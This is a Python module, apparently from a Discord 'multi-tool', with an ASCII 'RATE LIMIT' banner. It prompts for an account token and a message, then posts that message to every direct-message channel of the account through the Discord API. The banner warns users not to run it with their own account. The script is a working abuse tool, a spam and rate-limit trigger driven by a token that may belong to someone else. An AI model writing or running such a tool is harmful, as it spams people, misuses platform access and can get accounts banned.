import requests
import pystyle
from pystyle import *
import colorama
from colorama import *
import os
import fade
from utilities.Program.utils.utils import *


green = Fore.GREEN
red = Fore.RED
magenta = Fore.MAGENTA
blue = Fore.BLUE
r = Fore.WHITE
lmagenta = Fore.LIGHTMAGENTA_EX
lred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
cyan = Fore.CYAN
lgreen = Fore.LIGHTGREEN_EX

async def ratelimit():
    os.system('cls')
    print(fade.fire(text=f"""


 ██▀███   ▄▄▄     ▄▄▄█████▓▓█████     ██▓     ██▓ ███▄ ▄███▓ ██▓▄▄▄█████▓   
▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀    ▓██▒    ▓██▒▓██▒▀█▀ ██▒▓██▒▓  ██▒ ▓▒   
▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒███      ▒██░    ▒██▒▓██    ▓██░▒██▒▒ ▓██░ ▒░   
▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄    ▒██░    ░██░▒██    ▒██ ░██░░ ▓██▓ ░    
░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒   ░██████▒░██░▒██▒   ░██▒░██░  ▒██▒ ░    
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░   ░ ▒░▓  ░░▓  ░ ▒░   ░  ░░▓    ▒ ░░      
  ░▒ ░ ▒░  ▒   ▒▒ ░   ░     ░ ░  ░   ░ ░ ▒  ░ ▒ ░░  ░      ░ ▒ ░    ░       
  ░░   ░   ░   ▒    ░         ░        ░ ░    ▒ ░░      ░    ▒ ░  ░         
   ░           ░  ░           ░  ░       ░  ░ ░         ░    ░              
                                                                            
{red}[!] NE FAITES PAS CA AVEC VOTRE COMPTEs
{red}[!] DON'T DO THIS WITH YOUR ACCOUNT
                    
"""))
    token = input(red +'TOKEN : ')
    message = input(yellow + 'MESSAGE : ')

    headers = {'Authorization': token}

    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages',
            headers=headers,
            json={"content": message})  # Use json instead of data for sending JSON
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] ID: {channel['id']}")
        except Exception as e:
            print(f"ERROR :  {e}")
    
    Write.Print(f"\n\nWAIT FOR RATE LIMIT\n", Colors.red_to_yellow, interval=0.009)

    input(red + '\n\n[!] PRESS ENTER TO RETURN TO MENU')